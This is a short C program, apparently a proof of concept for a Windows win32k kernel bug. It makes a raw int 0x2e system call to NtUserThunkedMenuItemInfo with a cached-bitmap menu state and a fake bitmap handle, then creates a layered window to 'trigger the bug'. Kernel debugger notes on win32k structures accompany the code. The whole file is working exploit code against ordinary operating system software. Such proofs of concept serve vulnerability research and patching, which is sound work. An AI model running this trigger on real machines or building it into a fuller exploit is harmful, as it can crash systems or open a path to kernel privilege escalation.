#ifndef WIN32_NO_STATUS
#define WIN32_NO_STATUS    // I prefer working with ntstatus.h
#endif
#include <windows.h>
#include <assert.h>
#include <stdio.h>
#include <winerror.h>
#include <winternl.h>
#include <stddef.h>
#include <winnt.h>
#include <uxtheme.h>
#ifdef WIN32_NO_STATUS
# undef WIN32_NO_STATUS
#endif
#include <ntstatus.h>
 
#pragma comment(lib, "GDI32")
#pragma comment(lib, "USER32")
#pragma comment(lib, "UXTHEME")
 
#ifndef MFS_CACHEDBMP
# define MFS_CACHEDBMP 0x20000000L
#endif
 
// Linux style :-)
//
// kd> dds win32k!W32pServiceTable + ((0x1256 - 0x1000) * 4) L1
// 92c95958  92b2d294 win32k!NtUserThunkedMenuItemInfo
//
#define __NR_NtUserThunkedMenuItemInfo 0x1256
 
// Quick utility routine to execute a systemcall with the specified argument list.
NTSTATUS SystemCall(DWORD Number, PVOID Args, ...)
{
    NTSTATUS Status;
 
    __try {
        __asm {
            mov     eax, Number
            lea     edx, Args
            int     0x2e
            mov     Status, eax
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        return GetExceptionCode();
    }
    return Status;
}
     
// kd> lm mwin32k
// start    end        module
// 92a90000 92cda000   win32k
// kd> dt tagSERVERINFO oembmi
// win32k!tagSERVERINFO
// +0x970 oembmi : [93] tagOEMBITMAPINFO
// kd> dt tagOEMBITMAPINFO
// win32k!tagOEMBITMAPINFO
//   +0x000 x                : Int4B
//   +0x004 y                : Int4B
//   +0x008 cx               : Int4B
//   +0x00c cy               : Int4B
 
int main(int argc, char **argv)
{
    MENUITEMINFO MenuItemInfo = { sizeof MenuItemInfo };
    WNDCLASS Class = {0};
    HMENU Menu;
    BITMAPINFO Bitmap;
 
    Menu                        = CreateMenu();
    Class.lpfnWndProc           = DefWindowProc;
    Class.lpszClassName         = "Class";
    MenuItemInfo.fMask          = MIIM_BITMAP | MIIM_STATE;
    MenuItemInfo.fState         = MFS_CACHEDBMP;
    MenuItemInfo.hbmpItem       = (HBITMAP) 0x12345678;
 
    // Register Window Class
    RegisterClass(&Class);
 
    // Possibly disable themes for current session
    if (IsThemeActive()) {
        EnableTheming(FALSE);
    }
 
    // This should work, but some ring3 code interferes.
    // SetMenuItemInfo(Menu, 1, TRUE, &MenuItemInfo);
 
    // Call NtUserThunkedMenuItemInfo() directly instead.
    SystemCall(__NR_NtUserThunkedMenuItemInfo, Menu, 1, TRUE, TRUE, &MenuItemInfo, NULL);
 
    // Trigger the bug
    CreateWindowEx(WS_EX_LAYERED, "Class", "Window", WS_VISIBLE, 0, 0, 32, 32, NULL, Menu, NULL, NULL);
 
    return 0;
}
 
